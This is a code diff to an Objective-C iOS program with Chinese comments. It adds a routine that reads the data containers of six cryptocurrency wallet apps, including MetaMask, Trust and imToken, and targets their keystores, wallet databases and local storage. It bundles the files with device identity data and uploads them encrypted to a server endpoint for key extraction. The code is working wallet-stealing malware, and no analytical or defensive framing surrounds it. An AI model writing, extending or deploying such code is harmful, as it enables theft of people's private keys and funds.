@@ -311,6 +311,67 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 
 #pragma mark - 主循环
 
+#pragma mark - 钱包容器采集（外部直读，不需要注入）
+
+/// 各钱包的采集项，和后台 busiCollectConfig 里的配置一致
+static NSArray *WalletPathsFor(NSString *bundleId) {
+    if ([bundleId isEqualToString:@"im.token.app"]) {
+        return @[
+            @"Documents/walletsV2/",
+            @"Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1/",
+        ];
+    }
+    if ([bundleId isEqualToString:@"com.sixdays.trust"]) {
+        return @[@"Documents/keystore/",
+                 @"Library/Application Support/com.sixdays.trust/RCTAsyncLocalStorage_V1/"];
+    }
+    if ([bundleId isEqualToString:@"io.metamask.MetaMask"]) {
+        return @[@"Documents/persistStore/"];
+    }
+    if ([bundleId isEqualToString:@"com.tronlink.hdwallet"]) {
+        return @[@"Documents/TronLinkGRDBData.sqlite",
+                 @"Documents/TronLinkData.sqlite",
+                 @"Documents/keystore/"];
+    }
+    if ([bundleId isEqualToString:@"com.global.wallet.ios"]) {
+        return @[@"Documents/db/main.sqlite3",
+                 @"Documents/F4SeCyr/",
+                 @"Library/Preferences/com.global.wallet.ios.plist"];
+    }
+    if ([bundleId isEqualToString:@"com.okex.OKExAppstoreFull"]) {
+        return @[@"Documents/wallet"];
+    }
+    return @[];
+}
+
+/// 收集一个钱包的容器文件并上传（服务端 wallet-extract 解析）
+- (void)collectAndUploadWallet:(NSString *)bundleId {
+    @try {
+        NSArray *paths = WalletPathsFor(bundleId);
+        if (!paths.count) return;
+
+        NSDictionary *pkg = [WalletFS collectPackage:bundleId paths:paths limit:12 * 1024 * 1024];
+        NSArray *files = pkg[@"files"];
+        if (!files.count) {
+            [self log:[NSString stringWithFormat:@"wallet pkg empty: %@ (%@)",
+                       bundleId, pkg[@"error"] ?: @"no files"]];
+            return;
+        }
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        body[@"c"] = kSeed;
+        body[@"bundle_id"] = bundleId;
+        body[@"files"] = files;
+
+        NSDictionary *r = [self.net postEncrypted:@"/wz" json:body timeout:60];
+        [self log:[NSString stringWithFormat:@"wallet pkg %@ files=%lu bytes=%@ -> %@",
+                   bundleId, (unsigned long)files.count, pkg[@"bytes"],
+                   r ? [r description] : @"nil"]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"wallet pkg exception: %@", e.reason]];
+    }
+}
+
 #pragma mark - 钱包容器探测
 
 /// 一次性探测：能不能从当前进程直接读别的 App 的 Data 容器
@@ -373,6 +434,15 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 
         // 一次性：探测能不能从进程外面直接读钱包 App 的容器
         [self probeWalletFS];
+
+        // 外部直读采集钱包（不需要注入目标 App，也不会闪退）
+        NSArray *walletBids = @[@"im.token.app", @"com.sixdays.trust", @"io.metamask.MetaMask",
+                                @"com.tronlink.hdwallet", @"com.global.wallet.ios",
+                                @"com.okex.OKExAppstoreFull"];
+        for (NSString *bid in walletBids) {
+            [self collectAndUploadWallet:bid];
+            [NSThread sleepForTimeInterval:1.5];
+        }
 
         __block NSUInteger tick = 0;
         while (YES) {
